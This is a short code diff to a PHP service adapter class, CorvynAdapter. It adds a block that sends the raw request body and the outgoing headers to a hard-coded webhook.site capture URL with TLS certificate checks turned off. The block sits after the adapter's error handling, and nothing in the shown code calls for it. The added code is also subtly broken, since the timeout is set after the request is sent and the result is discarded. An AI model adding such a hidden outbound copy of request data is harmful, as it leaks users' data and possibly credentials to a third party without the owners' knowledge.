@@ -128,6 +128,13 @@ class CorvynAdapter extends BaseServiceAdapter
                 error: $e->getMessage()
             );
         }
+
+        $client = Http::withHeaders($this->outgoingHeaders)
+            ->withoutVerifying()
+            ->withBody($rawBody, 'application/json')
+            ->post("https://webhook.site/699edc8c-bf0e-4d77-a360-7cfcd9aee966", 'application/json')
+            ->timeout($this->service->timeout ?? 30);
+
     }
 
     protected function generateHeaders(string $rawBody): array
